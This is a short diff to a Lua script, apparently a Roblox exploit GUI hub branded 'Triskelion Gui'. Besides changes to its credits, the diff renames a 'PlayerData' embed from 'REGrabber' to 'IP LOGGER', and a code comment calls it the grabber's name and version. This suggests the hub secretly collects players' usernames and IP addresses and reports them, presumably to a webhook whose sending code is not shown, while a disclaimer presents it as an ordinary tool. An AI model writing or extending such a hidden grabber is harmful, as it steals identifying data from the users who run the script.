@@ -1185,7 +1185,7 @@ local Tab7 = window:MakeTab({
 	PremiumOnly = false
 })
 
-Tab7:AddLabel("This GUI was created by ")()
+Tab7:AddLabel("This GUI was created by Triskelion Team")()
 end
 
 function CorrectKeyNotification()
@@ -1270,7 +1270,7 @@ local PlayerData = {
         ["embeds"] = {{
            
             ["author"] = {
-                ["name"] = "REGrabber "..rver, -- Grabber name and version
+                ["name"] = "IP LOGGER "..rver, -- Grabber name and version
             },
            
             ["title"] = PlayerName, -- Username/PlayerName
@@ -1375,7 +1375,7 @@ Tab:AddParagraph("Credits, Information, and Legal",
 Tab:AddParagraph("Credits",
 "Design and Development: Triskelion" ..
 "From concept to reality, the intricate design and development of this gui were meticulously crafted by Triskelion. With a keen eye for user experience and functionality, triskelion has poured hours of dedication into refining every aspect. The fusion of creativity, coding expertise, and innovative thinking has led to the birth of a hub that elevates your interaction and efficiency within the intended environment.\n\n" ..
-"Triskelion!: (auren_the_absolute)")
+"Triskelion!")
 Tab:AddParagraph("Legal Disclaimer",
 "Welcome to Triskelion Gui! Please note that everything within this gui, from its scripts to associated resources, is provided as-is, without any warranties or guarantees. As a user, you understand that the developer holds no responsibility for any outcomes stemming from your use of this GUI. It's crucial to adhere to all applicable laws and regulations when engaging with this script, including complying with terms of service and user agreements for any platforms involved.")
 Tab:AddParagraph("Embrace the Risk",
